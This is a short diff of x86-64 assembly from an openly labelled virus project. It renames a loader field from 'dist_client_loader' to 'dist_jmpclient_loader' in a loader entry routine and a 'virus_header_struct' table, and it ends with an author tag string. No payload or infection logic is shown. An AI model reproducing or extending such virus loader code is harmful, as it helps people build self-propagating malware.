@@ -44,7 +44,7 @@ loader_entry:
 ; allocate space for structure fields
 	sub rsp, end_virus_header - virus_header_struct
 
-; dist_client_loader
+; dist_jmpclient_loader
 	lea rcx, [rel virus_header_struct + 0x38]
 	mov rcx, [rcx]
 	mov [rsp + 0x38], rcx
@@ -112,6 +112,6 @@ virus_header_struct:
 	dq loader_entry                                   ; dist_virus_loader
 	dq loader_entry                                   ; dist_vircall_loader
 	dq loader_entry                                   ; dist_header_loader
-	dq loader_entry                                   ; dist_client_loader
+	dq loader_entry                                   ; dist_jmpclient_loader
 end_virus_header:
 	db "Warning : Copyrighted Virus by __UNICORNS_OF_THE_APOCALYPSE__ <3"
